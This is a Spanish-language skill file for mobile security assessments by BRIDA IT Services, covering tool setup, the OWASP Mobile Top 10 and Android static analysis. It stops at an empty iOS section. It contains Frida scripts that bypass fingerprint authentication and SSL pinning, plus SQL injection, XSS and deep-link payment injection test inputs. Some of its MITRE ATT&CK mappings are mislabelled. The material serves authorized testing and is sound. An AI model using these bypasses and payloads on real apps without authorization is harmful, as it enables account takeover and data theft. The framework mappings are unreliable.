---
name: "Mobile Security - BRIDA IT Services"
description: >
  Skill integral de seguridad móvil para BRIDA IT Services. Cubre penetration testing de aplicaciones móviles (OWASP MASTG), análisis de seguridad Android/iOS, despliegue MDM/EMM, Mobile Threat Defense (MTD), y forensía de dispositivos móviles. Incluye metodología de pruebas, análisis estático/dinámico, reversing, análisis de red móvil, políticas MDM, y plantillas de reportes. Mapeo con MITRE ATT&CK Mobile, NIST CSF 2.0, y MITRE D3FEND.
triggers:
  - "mobile security"
  - "mobile pentest"
  - "Android security"
  - "iOS security"
  - "MDM"
  - "EMM"
  - "mobile app security"
  - "OWASP MASTG"
  - "mobile threat defense"
  - "MTD"
  - "mobile forensics"
  - "BYOD"
  - "mobile device management"
  - "app security testing"
  - "reverse engineering mobile"
  - "jailbreak detection"
  - "root detection"
  - "BRIDA mobile"
  - "seguridad móvil"
  - "pentesting móvil"
  - "análisis de apps"
  - "frida"
  - "objection"
category: "security"
subdomain: "mobile-security"
tags:
  - mobile-security
  - mobile-pentest
  - Android
  - iOS
  - MDM
  - EMM
  - mobile-app-security
  - OWASP-MASTG
  - MTD
  - mobile-forensics
  - BYOD
  - Frida
  - Burp-Suite
  - reversing
  - nist-csf
  - mitre-attack
  - d3fend
  - ssl-pinning
  - jailbreak
  - root-detection
version: "2.0"
author: "BRIDA IT Services"
license: "Apache-2.0"
language: "es"
mitre_attack:
  # Reconnaissance
  - T1592  # Gather Victim Host Information (mobile device fingerprinting)
  - T1589  # Gather Victim Identity Information (user accounts on device)
  # Initial Access
  - T1444  # Masquerade as Legitimate Application
  - T1476  # Delivery via Malicious App (phishing with app)
  - T1660  # Repackaged Application
  # Persistence
  - T1409  # Stored Data Manipulation
  - T1577  # Compromise Application Executable
  - T1424  # Compromise Application Executable (mobile-specific)
  # Privilege Escalation
  - T1433  # Access Sensitive Data in Device Logs
  - T1430  # Location Tracking
  # Defense Evasion
  - T1540  # Code Snippet Obfuscation
  - T1626  # Abuse Elevation Control Mechanism (jailbreak/root)
  - T1633  # Virtualization/Sandbox Evasion
  - T1408  # Disguise Root/Jailbreak Indicators
  # Credential Access
  - T1414  # Credential Storage Exploitation (Keychain/Keystore)
  - T1413  # Access Sensitive Data in Device Logs (credentials)
  - T1635  # Adversary-in-the-Middle (mobile network)
  # Collection
  - T1417  # Input Capture (keylogger on mobile)
  - T1429  # Audio Capture (microphone)
  - T1512  # Video Capture (camera)
  - T1430  # Location Tracking
  - T1412  # SMS Messages
  - T1636  # Protected User Data
  # Exfiltration
  - T1639  # Exfiltration Over Alternative Protocol (mobile)
  - T1644  # Outbound Command and Control (mobile)
  # Impact
  - T1448  # Denial of Service (mobile app)
  - T1464  # Network Denial of Service (mobile)
  # Command and Control
  - T1437  # Application Layer Protocol (mobile C2)
  - T1436  # Commonly Used Port (mobile)
nist_csf:
  # Identify
  - ID.AM-01  # Physical devices and systems inventoried (mobile devices)
  - ID.AM-02  # Software platforms and applications inventoried (mobile apps)
  - ID.AM-03  # Organizational communication and data flows mapped (mobile data flows)
  - ID.AM-05  # Resources prioritized based on classification (mobile data classification)
  - ID.RA-01  # Vulnerabilities in mobile apps and devices identified
  - ID.RA-03  # Threats, vulnerabilities, likelihoods used to determine risk
  - ID.RA-05  # Threats, vulnerabilities, likelihoods used to determine risk
  - ID.RA-06  # Risk responses prioritized (mobile-specific risks)
  - ID.SC-01  # Supply chain risk management (third-party mobile SDKs)
  # Protect
  - PR.AC-01  # Identities and credentials issued, managed, verified (mobile auth)
  - PR.AC-03  # Remote access managed (mobile remote access)
  - PR.AC-04  # Access permissions managed (mobile app permissions)
  - PR.AC-06  # Least privilege principle (mobile app permissions)
  - PR.DS-01  # Data-at-rest protected (mobile storage encryption)
  - PR.DS-02  # Data-in-transit protected (mobile TLS/SSL)
  - PR.IP-01  # Baseline configuration maintained (mobile device config)
  - PR.IP-03  # Configuration change control (mobile app updates)
  - PR.PT-03  # Least functionality principle (mobile app minimal permissions)
  - PR.PT-05  # Mechanisms implemented to achieve resilience (mobile backup)
  # Detect
  - DE.CM-01  # Network environments monitored (mobile network traffic)
  - DE.CM-03  # Personnel activity monitored (mobile user behavior)
  - DE.CM-06  # External service provider activities monitored (MTD)
  - DE.CM-08  # Vulnerability scans performed (mobile app scanning)
  - DE.AE-02  # Potentially malicious activity analyzed (mobile threats)
  - DE.AE-03  # Event data correlated and analyzed (mobile SIEM)
  - DE.AE-06  # Information from multiple sources correlated
  # Respond
  - RS.AN-03  # Forensic analysis performed (mobile forensics)
  - RS.AN-05  # Incident monitoring data collected (mobile logs)
  - RS.MI-01  # Incidents contained (remote wipe)
  - RS.MI-02  # Incidents mitigated (MDM policy enforcement)
  # Recover
  - RC.RP-01  # Recovery plan executed (mobile device recovery)
  - RC.RP-05  # Integrity of backups verified (mobile backup integrity)
d3fend:
  # Mobile-Specific Defenses
  - D3-MFA   # Multi-factor Authentication (mobile biometric + PIN)
  - D3-EDR   # Endpoint Detection and Response (mobile EDR/MTD)
  - D3-SAV   # Software Attribute Verification (app integrity)
  - D3-FR    # Firmware Revision Verification (OS patch level)
  - D3-PLA   # Platform Monitoring (device compliance)
  - D3-CE    # Configuration Enforcement (MDM policy enforcement)
  - D3-AC    # Access Control (app-level access control)
  - D3-AI    # Asset Inventory (mobile device inventory)
  - D3-DEN   # Data Encryption (device and app encryption)
  - D3-DL    # Data Loss Prevention (mobile DLP)
  - D3-DC    # Data Classification (mobile data classification)
  - D3-IM    # Identity Management (mobile identity)
  - D3-PM    # Privilege Management (app permission management)
  - D3-NI    # Network Isolation (per-app VPN)
  - D3-NTA   # Network Traffic Analysis (mobile traffic inspection)
  - D3-TA    # Traffic Analysis (mobile protocol analysis)
  - D3-ANA   # Authentication Analysis (mobile auth mechanisms)
  - D3-SS    # Session Analysis (mobile session management)
  - D3-SJA   # System Call Analysis (mobile API monitoring)
  - D3-CB    # Certificate-based Authentication (mobile cert pinning)
  - D3-EAL   # Execution Allowlisting (mobile app allowlisting)
  - D3-DA    # Dynamic Analysis (mobile app dynamic testing)
  - D3-PSA   # Process Spawn Analysis (mobile process monitoring)
  - D3-FCA   # File Content Analysis (mobile file analysis)
  - D3-ISVA  # Input Source Validation Analysis (mobile input validation)
  - D3-SBV   # Software Behavior Validation (mobile app behavior)
  - D3-LA    # Log Analysis (mobile device logs)
  - D3-RA    # Risk Assessment (mobile risk scoring)
  - D3-VA    # Vulnerability Assessment (mobile vuln scanning)
  - D3-SC    # Security Configuration (mobile hardening)
  - D3-SR    # Security Reporting (mobile security reports)

---

# Mobile Security — BRIDA IT Services v2.0

> **Stack principal:** Kali Linux 2024.x | Android SDK Platform Tools | iOS Tools
> **Estándares:** OWASP MASTG v1.7, OWASP Mobile Top 10 (2024), NIST SP 800-124 Rev. 2
> **Frameworks:** MITRE ATT&CK Mobile v15, NIST CSF 2.0, MITRE D3FEND

---

## Tabla de Contenido

1. [Visión General](#visión-general)
2. [Cuándo Usar](#cuándo-usar)
3. [Pre-requisitos y Reglas de Engagement](#pre-requisitos-y-reglas-de-engagement)
4. [OWASP Mobile Top 10 (2024)](#owasp-mobile-top-10-2024)
5. [OWASP MASTG — Metodología de Pruebas](#owasp-mastg--metodología-de-pruebas)
6. [Fase 1: Static Analysis (SAST)](#fase-1-static-analysis-sast)
7. [Fase 2: Dynamic Analysis (DAST)](#fase-2-dynamic-analysis-dast)
8. [Fase 3: Network Analysis](#fase-3-network-analysis)
9. [Fase 4: API Testing Móvil](#fase-4-api-testing-móvil)
10. [Android Security Deep Dive](#android-security-deep-dive)
11. [iOS Security Deep Dive](#ios-security-deep-dive)
12. [Reversing de Aplicaciones Móviles](#reversing-de-aplicaciones-móviles)
13. [MDM/EMM — Despliegue y Gestión](#mdmemm--despliegue-y-gestión)
14. [Mobile Threat Defense (MTD)](#mobile-threat-defense-mtd)
15. [Mobile Device Forensics](#mobile-device-forensics)
16. [Mapeo a Frameworks](#mapeo-a-frameworks)
17. [Entregables](#entregables)
18. [Checklist Pre-Engagement](#checklist-pre-engagement)
19. [Consideraciones Legales (México)](#consideraciones-legales-méxico)

---

## Visión General

### Objetivo

Este skill proporciona un framework completo para la evaluación de seguridad móvil en el contexto de BRIDA IT Services. Está diseñado para:

- Estandarizar las pruebas de seguridad móvil (apps Android/iOS)
- Garantizar cobertura completa según OWASP MASTG y Mobile Top 10
- Integrar mapeos con frameworks reconocidos (MITRE ATT&CK Mobile, NIST CSF 2.0, D3FEND)
- Guiar el despliegue de soluciones MDM/EMM para clientes
- Proporcionar capacidades de Mobile Threat Defense y forensía móvil

### Alcance

| Área | Descripción |
|------|-------------|
| **Mobile App Pentesting** | Pruebas de seguridad en aplicaciones Android (APK/AAB) e iOS (IPA) |
| **Análisis Estático** | Revisión de código, binarios, configuración y permisos |
| **Análisis Dinámico** | Runtime analysis, instrumentación, interceptación de tráfico |
| **Reversing** | Decompilación, análisis de binarios, bypass de protecciones |
| **MDM/EMM** | Despliegue, configuración y auditoría de gestión de dispositivos |
| **MTD** | Detección de amenazas móviles, evaluación de soluciones |
| **Forensía Móvil** | Adquisición y análisis forense de dispositivos Android/iOS |

---

## Cuándo Usar

- Evaluación de seguridad de aplicaciones móviles corporativas (antes del lanzamiento)
- Penetration testing de apps móviles como parte de un assessment integral
- Despliegue inicial de MDM/EMM para gestión de dispositivos empresariales
- Evaluación de seguridad de dispositivos BYOD (Bring Your Own Device)
- Auditoría de seguridad de apps móviles de clientes (ej: apps de banca, salud, retail)
- Respuesta a incidentes que involucran dispositivos móviles
- Evaluación de Mobile Threat Defense (MTD) para seleccionar solución
- Forensía móvil post-incidente (robo de datos, compromiso de dispositivo)
- Validación de cumplimiento regulatorio (CNBV, LFPDPPP, PCI-DSS para apps de pago)
- Evaluación de SDKs de terceros integrados en aplicaciones móviles

---

## Pre-requisitos y Reglas de Engagement

> ⚠️ **ADVERTENCIA LEGAL:** Realizar pruebas de seguridad en aplicaciones o dispositivos sin autorización escrita es un **delito** en México (Art. 211 bis del Código Penal Federal, Ley Federal de Protección de Datos Personales). BRIDA IT Services NO ejecuta pruebas sin documentación completa.

### Pre-requisitos Obligatorios

| # | Requisito | Descripción |
|---|-----------|-------------|
| 1 | **Autorización escrita** | Documento firmado por el cliente con alcance explícito (SOW) |
| 2 | **Reglas de Engagement** | Documento detallando qué se puede y qué NO se puede hacer |
| 3 | **Ventana de testing** | Fechas y horarios acordados para las pruebas |
| 4 | **Contacto de emergencia** | Persona del cliente disponible durante el testing |
| 5 | **NDA firmado** | Acuerdo de confidencialidad mutuo |
| 6 | **Binarios de la app** | APK/AAB (Android) o IPA (iOS) proporcionados por el cliente |
| 7 | **Credenciales de prueba** | Cuentas de test para la app y API backend |
| 8 | **Dispositivos de prueba** | Dispositivos físicos o emuladores configurados |
| 9 | **Documentación técnica** | Arquitectura de la app, endpoints de API, flujos de autenticación |
| 10 | **Manejo de datos sensibles** | Protocolo para datos personales encontrados durante el assessment |

### Configuración del Entorno de Trabajo

#### Android Pentesting Environment
```bash
# Herramientas esenciales
sudo apt update && sudo apt install -y \
  apktool jadx dex2jar \
  android-sdk-platform-tools \
  burpsuite frida-tools objection \
  sqlite3 wget curl

# Verificar ADB
adb version
adb devices

# Instalar Frida server en dispositivo rooteado
# Descargar desde: https://github.com/frida/frida/releases
adb push frida-server-android-x86_64 /data/local/tmp/
adb shell "chmod 755 /data/local/tmp/frida-server-android-x86_64"
adb shell "su -c '/data/local/tmp/frida-server-android-x86_64 &'"

# Configurar proxy Burp Suite en dispositivo
# Settings > Wi-Fi > Modify Network > Manual Proxy
# Host: <IP de la máquina atacante>  Port: 8080

# Instalar certificado CA de Burp en Android
# Convertir certificado a formato PEM
openssl x509 -inform DER -in cacert.der -out cacert.pem
# Calcular hash del subject
HASH=$(openssl x509 -inform PEM -subject_hash_old -in cacert.pem | head -1)
# Renombrar e instalar
cp cacert.pem ${HASH}.0
adb push ${HASH}.0 /data/local/tmp/
adb shell "su -c 'mount -o rw,remount /system'"
adb shell "su -c 'cp /data/local/tmp/${HASH}.0 /system/etc/security/cacerts/'"
adb shell "su -c 'chmod 644 /system/etc/security/cacerts/${HASH}.0'"
```

#### iOS Pentesting Environment
```bash
# Herramientas esenciales (macOS recomendado)
brew install libimobiledevice ideviceinstaller
pip3 install objection frida-tools

# Herramientas adicionales
# - frida-ios-dump: para extraer IPAs de dispositivos jailbroken
# - clutch: alternativa para dump de binarios
# - class-dump: para extraer headers de Objective-C

# Verificar conexión con dispositivo iOS
ideviceinfo
ideviceinstaller list

# Configurar proxy en iOS
# Settings > Wi-Fi > [Red] > Configure Proxy > Manual

# Instalar certificado CA de Burp en iOS
# Settings > General > VPN & Device Management > Install Profile
# Luego: Settings > General > About > Certificate Trust Settings > Enable Full Trust
```

---

## OWASP Mobile Top 10 (2024)

### M1: Improper Credential Usage (Uso Incorrecto de Credenciales)

**Descripción:** La aplicación no gestiona adecuadamente las credenciales de usuario, tokens de acceso o claves de API.

**Vectores de ataque:**
- Credenciales hardcodeadas en el código fuente
- Tokens almacenados en texto plano (SharedPreferences, NSUserDefaults)
- Gestión débil de tokens de refresh
- Falta de rotación de tokens

**Pruebas MASTG:**
- `MASTG-TEST-0001` — Credenciales en código fuente
- `MASTG-TEST-0002` — Credenciales en archivos de configuración
- `MASTG-TEST-0003` — Credenciales en logs

**Ejemplo de detección:**
```bash
# Buscar credenciales hardcodeadas
grep -rE "(password|secret|api_key|token|auth)" \
  --include="*.java" --include="*.kt" --include="*.swift" --include="*.m" \
  app_decompiled/

# Buscar en archivos de recursos
grep -rE "(password|secret|api_key|token)" \
  app_decompiled/res/values/strings.xml
```

**Remediación:**
- Usar Android Keystore / iOS Keychain para almacenamiento seguro
- Implementar OAuth 2.0 con PKCE para autenticación
- Rotar tokens periódicamente
- No almacenar credenciales en texto plano bajo ninguna circunstancia

---

### M2: Inadequate Supply Chain Security (Seguridad Inadecuada de Cadena de Suministro)

**Descripción:** La aplicación depende de componentes de terceros (SDKs, librerías) que pueden contener vulnerabilidades o comportamiento malicioso.

**Vectores de ataque:**
- SDKs de terceros con vulnerabilidades conocidas (CVEs)
- Librerías desactualizadas con fallos de seguridad
- CI/CD pipeline inseguro que permite inyección de código malicioso
- Dependencias sin firma digital verificada

**Pruebas MASTG:**
- `MASTG-TEST-0004` — Análisis de dependencias de terceros
- `MASTG-TEST-0005` — Verificación de firma de código

**Ejemplo de detección:**
```bash
# Android: analizar dependencias Gradle
cat app_decompiled/smali*/com/google/gms/  # Google Play Services
grep -r "implementation\|compile" app_decompiled/../build.gradle

# Verificar librerías nativas (.so files)
find app_decompiled/ -name "*.so" -exec file {} \;

# iOS: analizar frameworks embebidos
find Payload/*.app/Frameworks -name "*.framework" -exec ls -la {} \;
```

**Remediación:**
- Mantener un inventario de todos los SDKs y dependencias (SBOM)
- Actualizar dependencias regularmente
- Verificar integridad de librerías con checksums
- Usar dependency scanning tools (Snyk, OWASP Dependency-Check)
- Firmar todo el código con certificados válidos

---

### M3: Insecure Authentication/Authorization (Autenticación/Autorización Insegura)

**Descripción:** Mecanismos de autenticación y autorización débiles o mal implementados que permiten acceso no autorizado.

**Vectores de ataque:**
- Autenticación solo en el cliente (bypassable)
- Bypass de autenticación biométrica
- Token theft y replay attacks
- Falta de validación de sesión en el servidor
- IDOR (Insecure Direct Object Reference) en APIs móviles

**Pruebas MASTG:**
- `MASTG-TEST-0006` — Bypass de autenticación
- `MASTG-TEST-0007` — Validación de tokens
- `MASTG-TEST-0008` — Autorización en el servidor

**Ejemplo de detección:**
```bash
# Probar autenticación con Frida
frida -U -f com.target.app -l auth-bypass.js --no-pause

# Script Frida para bypass de autenticación biométrica (Android)
# auth-bypass.js
Java.perform(function() {
    var fingerprintManager = Java.use('android.hardware.fingerprint.FingerprintManager');
    fingerprintManager.authenticate.overload(
        'android.hardware.fingerprint.FingerprintManager$CryptoObject',
        'android.os.CancellationSignal',
        'int',
        'android.hardware.fingerprint.FingerprintManager$AuthenticationCallback',
        'android.os.Handler'
    ).implementation = function() {
        console.log('[+] Bypassing fingerprint authentication');
        return;
    };
});
```

**Remediación:**
- Implementar autenticación siempre en el servidor
- Usar OAuth 2.0 / OpenID Connect con PKCE
- Validar tokens JWT en el servidor con cada request
- Implementar rate limiting en endpoints de autenticación
- Usar certificate pinning para prevenir MITM

---

### M4: Insufficient Input/Output Validation (Validación Insuficiente de Entrada/Salida)

**Descripción:** La aplicación no valida adecuadamente los datos de entrada o salida, permitiendo ataques de inyección.

**Vectores de ataque:**
- SQL injection en bases de datos locales (SQLite)
- XSS en WebViews
- Path traversal en operaciones de archivo
- Command injection a través de intents (Android)
- Inyección de datos a través de deep links / URL schemes

**Pruebas MASTG:**
- `MASTG-TEST-0009` — SQL injection en almacenamiento local
- `MASTG-TEST-0010` — XSS en WebView
- `MASTG-TEST-0011` — Validación de deep links

**Ejemplo de detección:**
```bash
# Probar SQL injection en Content Providers (Android)
adb shell content query --uri content://com.target.app.provider/users \
  --where "username=' OR 1=1--"

# Probar XSS en WebView
# Inyectar: <script>alert(document.cookie)</script>
# en cualquier campo de entrada que se renderice en WebView

# Probar deep link injection
adb shell am start -a android.intent.action.VIEW \
  -d "targetapp://payment?amount=0&to=attacker"
```

**Remediación:**
- Usar parameterized queries para todas las operaciones de base de datos
- Sanitizar todo input antes de renderizar en WebView
- Validar y sanitizar deep links / URL schemes
- Implementar Content Security Policy en WebViews
- Usar allowlists para URLs permitidas en WebView

---

### M5: Insecure Communication (Comunicación Insegura)

**Descripción:** La aplicación no protege adecuadamente los datos en tránsito entre el dispositivo y los servidores.

**Vectores de ataque:**
- Tráfico HTTP sin cifrar (cleartext)
- SSL/TLS con configuración débil (protocolos obsoletos, ciphers débiles)
- Certificate validation bypass
- Man-in-the-middle (MITM) attacks
- SSL pinning no implementado o bypassable

**Pruebas MASTG:**
- `MASTG-TEST-0012` — Verificar uso de TLS
- `MASTG-TEST-0013` — Validación de certificados
- `MASTG-TEST-0014` — SSL pinning implementation

**Ejemplo de detección:**
```bash
# Verificar tráfico cleartext en AndroidManifest.xml
grep -r "usesCleartextTraffic" app_decompiled/AndroidManifest.xml

# Verificar ATS (App Transport Security) en iOS Info.plist
plutil -p Payload/*.app/Info.plist | grep -A5 "NSAppTransportSecurity"

# Verificar SSL pinning con Frida
frida -U -f com.target.app -l ssl-pinning-check.js

# Script para detectar SSL pinning (Android - OkHttp)
Java.perform(function() {
    var CertificatePinner = Java.use('okhttp3.CertificatePinner');
    CertificatePinner.check.overload('java.lang.String', 'java.util.List').implementation = function(hostname, peerCertificates) {
        console.log('[+] SSL Pinning detected for: ' + hostname);
        // No llamar al original = bypass
        return;
    };
});
```

**Remediación:**
- Forzar HTTPS para todas las comunicaciones (deshabilitar cleartext)
- Implementar TLS 1.2+ con ciphers fuertes
- Implementar certificate pinning (HPKP o pinning a nivel app)
- Usar Android Network Security Configuration
- Habilitar ATS (App Transport Security) en iOS
- Implementar certificate transparency

---

### M6: Inadequate Privacy Controls (Controles de Privacidad Inadecuados)

**Descripción:** La aplicación recopila, almacena o transmite datos personales sin las protecciones adecuadas.

**Vectores de ataque:**
- Recopilación excesiva de datos personales (PII)
- Fuga de PII a través de logs, analytics, o terceros
- Falta de política de privacidad o consentimiento
- Compartición no autorizada de datos con SDKs de terceros
- Tracking del usuario sin consentimiento explícito

**Pruebas MASTG:**
- `MASTG-TEST-0015` — Identificación de PII en almacenamiento
- `MASTG-TEST-0016` — Fuga de PII en tráfico de red
- `MASTG-TEST-0017` — Análisis de permisos excesivos

**Ejemplo de detección:**
```bash
# Analizar permisos solicitados (Android)
aapt dump permissions app.apk

# Buscar PII en archivos de la app
grep -rE "([0-9]{3}-[0-9]{2}-[0-9]{4}|[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})" \
  app_decompiled/

# Analizar tráfico para detectar exfiltración de PII
# En Burp Suite: filtrar por patrones de datos personales
# En Wireshark: http.request.method == "POST" && tcp contains "email"

# Verificar SDKs de analytics/tracking
grep -r "facebook\|google-analytics\|firebase\|appsflyer\|adjust" \
  app_decompiled/ --include="*.java" --include="*.smali"
```

**Remediación:**
- Minimización de datos: recopilar solo lo estrictamente necesario
- Anonimización/pseudonimización de datos personales
- Implementar consentimiento explícito (GDPR/LFPDPPP compliant)
- Auditar SDKs de terceros para verificar qué datos recopilan
- Implementar cifrado para todos los datos personales almacenados
- Proporcionar mecanismos de eliminación de datos del usuario

---

### M7: Insufficient Binary Protections (Protecciones Binarias Insuficientes)

**Descripción:** La aplicación no implementa protecciones adecuadas contra el reversing, tampering o debugging.

**Vectores de ataque:**
- Ausencia de obfuscación de código
- Debugging habilitado en producción
- Falta de detección de root/jailbreak
- Falta de verificación de integridad del binario
- Repackaging y redistribución de la app

**Pruebas MASTG:**
- `MASTG-TEST-0018` — Verificar obfuscación
- `MASTG-TEST-0019` — Detección de debugging
- `MASTG-TEST-0020` — Verificación de integridad

**Ejemplo de detección:**
```bash
# Verificar si la app tiene debugging habilitado
grep -r "android:debuggable" app_decompiled/AndroidManifest.xml

# Verificar obfuscación (ProGuard/R8 en Android)
# Si los nombres de clase están legibles, no hay obfuscación
jadx --show-bad app.apk | head -50

# Verificar si hay detección de root
grep -r "root\|su\|magisk\|supersu" \
  app_decompiled/ --include="*.smali" | head -20

# Verificar firma del binario
apksigner verify --verbose app.apk
# iOS: codesign -dv --verbose=4 Payload/*.app
```

**Remediación:**
- Habilitar ProGuard/R8 (Android) o LLVM obfuscation (iOS)
- Deshabilitar debuggable en builds de producción
- Implementar detección de root/jailbreak
- Implementar verificación de firma del binario (tamper detection)
- Usar herramientas de hardening (DexGuard, ProGuard, iXGuard)
- Implementar anti-debugging techniques
- Usar integrity checks en runtime

---

### M8: Security Misconfiguration (Mala Configuración de Seguridad)

**Descripción:** Configuraciones inseguras en la aplicación, el servidor o los servicios asociados.

**Vectores de ataque:**
- Modo debug habilitado en producción
- Mensajes de error verbosos que revelan información interna
- Configuraciones por defecto sin cambiar
- Backups automáticos con datos sensibles (Android)
- Permisos excesivos solicitados
- File sharing habilitado innecesariamente

**Pruebas MASTG:**
- `MASTG-TEST-0021` — Configuración de permisos
- `MASTG-TEST-0022` — Configuración de backups
- `MASTG-TEST-0023` — Configuración de componentes exportados

**Ejemplo de detección:**
```bash
# Verificar componentes exportados en Android
grep -r "exported=\"true\"" app_decompiled/AndroidManifest.xml

# Verificar configuración de backup
grep -r "allowBackup" app_decompiled/AndroidManifest.xml

# Verificar permisos excesivos
aapt dump permissions app.apk | grep -i "sms|camera|location|contacts|microphone"

# Verificar file sharing (Android FileProvider)
grep -r "FileProvider\|android.support.v4.content" \
  app_decompiled/AndroidManifest.xml

# iOS: verificar grupos de Keychain compartidos
grep -r "keychain-access-groups" Payload/*.app/Info.plist
```

**Remediación:**
- Minimizar permisos al mínimo necesario
- Deshabilitar allowBackup si no es necesario
- Marcar componentes como exported="false" cuando no necesiten ser accesibles
- Eliminar información de debug de builds de producción
- Configurar FileProvider de forma restrictiva
- Auditar configuraciones de servicios cloud asociados (Firebase, S3, etc.)

---

### M9: Insecure Data Storage (Almacenamiento Inseguro de Datos)

**Descripción:** Datos sensibles almacenados sin cifrado o en ubicaciones accesibles.

**Vectores de ataque:**
- Datos sensibles en SharedPreferences / NSUserDefaults sin cifrar
- Bases de datos SQLite sin cifrar con datos sensibles
- Logs que contienen tokens, contraseñas o PII
- Datos sensibles en memoria sin protección
- Cache con información sensible (imágenes, web cache)
- Datos en clipboard accesibles por otras apps

**Pruebas MASTG:**
- `MASTG-TEST-0024` — Análisis de SharedPreferences
- `MASTG-TEST-0025` — Análisis de bases de datos locales
- `MASTG-TEST-0026` — Análisis de logs
- `MASTG-TEST-0027` — Análisis de Keychain/Keystore

**Ejemplo de detección:**
```bash
# Android: extraer y analizar datos del dispositivo
adb shell run-as com.target.app cat shared_prefs/*.xml
adb shell run-as com.target.app ls -la databases/
adb pull /data/data/com.target.app/databases/ ./extracted_dbs/

# Analizar bases de datos SQLite
sqlite3 extracted_dbs/app.db ".tables"
sqlite3 extracted_dbs/app.db "SELECT * FROM users;"
sqlite3 extracted_dbs/app.db "SELECT * FROM sessions;"

# Buscar datos sensibles en logs
adb logcat -d | grep -iE "password|token|secret|key|auth|credential"

# iOS: analizar datos del dispositivo
idevicebackup2 backup --full /tmp/ios_backup
# Extraer y analizar archivos plist, bases de datos, etc.

# Verificar uso de Android Keystore
grep -r "AndroidKeyStore\|KeyGenParameterSpec" \
  app_decompiled/ --include="*.smali"
```

**Remediación:**
- Usar Android Keystore para almacenar claves criptográficas
- Usar iOS Keychain para datos sensibles
- Cifrar bases de datos locales con SQLCipher
- No almacenar datos sensibles en SharedPreferences/NSUserDefaults
- Limpiar clipboard después de usar datos sensibles
- Deshabilitar logging de datos sensibles en producción
- Implementar secure memory handling (limpiar memoria después de usar)

---

### M10: Insufficient Cryptography (Criptografía Insuficiente)

**Descripción:** Uso de algoritmos criptográficos débiles, claves hardcodeadas o implementación incorrecta de criptografía.

**Vectores de ataque:**
- Algoritmos débiles (MD5, SHA1, DES, RC4)
- Claves de cifrado hardcodeadas en el código
- IVs (Initialization Vectors) predecibles o reutilizados
- Modo ECB para cifrado simétrico
- Implementación custom de criptografía (no probada)
- Generación de números aleatorios insegura

**Pruebas MASTG:**
- `MASTG-TEST-0028` — Identificar algoritmos débiles
- `MASTG-TEST-0029` — Verificar gestión de claves
- `MASTG-TEST-0030` — Verificar implementación de cifrado

**Ejemplo de detección:**
```bash
# Buscar algoritmos débiles
grep -rE "MD5|SHA1|DES|RC4|ECB" \
  app_decompiled/ --include="*.java" --include="*.smali" --include="*.swift"

# Buscar claves hardcodeadas
grep -rE "SecretKeySpec|IvParameterSpec" \
  app_decompiled/ --include="*.smali" -A3

# Buscar uso de SecureRandom vs Random
grep -r "java.security.SecureRandom\|java.util.Random" \
  app_decompiled/ --include="*.smali"

# Verificar implementación custom de crypto
grep -rE "Cipher.getInstance" \
  app_decompiled/ --include="*.smali" | grep -v "AES/GCM"
```

**Remediación:**
- Usar AES-256-GCM para cifrado simétrico
- Us SHA-256 o superior para hashing
- Usar Android Keystore / iOS Keychain para gestión de claves
- Generar IVs aleatorios para cada operación de cifrado
- Nunca implementar criptografía custom — usar librerías auditadas
- Usar SecureRandom para generación de números aleatorios
- Implementar key rotation

---

## OWASP MASTG — Metodología de Pruebas

### Estructura del MASTG

El OWASP Mobile Application Security Testing Guide (MASTG) organiza las pruebas en categorías:

| Categoría | ID Rango | Descripción |
|-----------|----------|-------------|
| **Platform Overview** | MASVS-STORAGE | Almacenamiento de datos |
| **Authentication** | MASVS-AUTH | Autenticación y gestión de sesiones |
| **Network** | MASVS-NETWORK | Comunicaciones de red |
| **Cryptography** | MASVS-CRYPTO | Implementación criptográfica |
| **Code Quality** | MASVS-CODE | Calidad de código y configuraciones |
| **Resilience** | MASVS-RESILIENCE | Resiliencia contra reversing |
| **Platform Interaction** | MASVS-PLATFORM | Interacción con la plataforma |
| **Privacy** | MASVS-PRIVACY | Protección de datos personales |

### Niveles de Testing

| Nivel | Descripción | Cuándo Aplicar |
|-------|-------------|----------------|
| **MASTG-ARCH** | Pruebas de arquitectura y diseño | Fase de diseño / threat modeling |
| **MASTG-STORAGE** | Pruebas de almacenamiento de datos | SAST + DAST |
| **MASTG-AUTH** | Pruebas de autenticación | DAST + API testing |
| **MASTG-NETWORK** | Pruebas de red | Network analysis + proxy |
| **MASTG-CRYPTO** | Pruebas de criptografía | SAST + reversing |
| **MASTG-CODE** | Pruebas de calidad de código | SAST |
| **MASTG-RESILIENCE** | Pruebas de resiliencia | Reversing + tampering |
| **MASTG-PLATFORM** | Pruebas de interacción con plataforma | DAST + reversing |
| **MASTG-PRIVACY** | Pruebas de privacidad | SAST + DAST + network |

---

## Fase 1: Static Analysis (SAST)

### Android Static Analysis

```bash
# === DECOMPILACIÓN ===

# Apktool — decompilación a Smali + recursos
apktool d app.apk -o app_decompiled --force-all

# JADX — decompilación a Java/Kotlin (más legible)
jadx --deobf --show-bad --output-dir app_java app.apk

# dex2jar + JD-GUI (alternativa)
d2j-dex2jar app.apk -o app.jar
# Abrir app.jar con JD-GUI

# === ANÁLISIS DE MANIFEST ===
cat app_decompiled/AndroidManifest.xml | grep -E \
  "permission|exported|debuggable|allowBackup|usesCleartextTraffic"

# === BÚSQUEDA DE SECRETOS ===
# TruffleHog (detección de secrets)
trufflehog filesystem app_decompiled/

# Gitleaks (alternativa)
gitleaks detect --source app_decompiled/ -v

# Búsqueda manual de patrones
grep -rE "(password|passwd|secret|api_key|apikey|token|auth|private_key|client_secret)" \
  app_decompiled/ --include="*.xml" --include="*.smali" --include="*.json"

# Buscar URLs y endpoints
grep -rE "https?://[^\s\"']+" app_decompiled/ --include="*.smali" | sort -u

# === ANÁLISIS DE CÓDIGO ===
# Verificar uso de algoritmos débiles
grep -rE "MD5|SHA1|DES|RC4" app_java/ --include="*.java"

# Verificar logging de datos sensibles
grep -rE "Log\.(d|i|v|w|e)" app_java/ --include="*.java" | grep -iE "password|token|secret"

# Verificar SQL queries (inyección)
grep -rE "rawQuery|execSQL" app_java/ --include="*.java"

# Verificar WebView configuration
grep -rE "setJavaScriptEnabled|addJavascriptInterface" app_java/ --include="*.java"

# === ANÁLISIS DE LIBRERÍAS NATIVAS ===
find app_decompiled/ -name "*.so" | while read f; do
    echo "=== $f ==="
    file "$f"
    strings "$f" | grep -iE "password|secret|key|http" | head -5
done

# === ANÁLISIS DE RECURSOS ===
# Verificar archivos de recursos para secrets
cat app_decompiled/res/values/strings.xml | grep -iE "password|secret|key|api"
cat app_decompiled/res/values/integers.xml
cat app_decompiled/res/xml/network_security_config.xml 2>/dev/null
```

### iOS Static Analysis

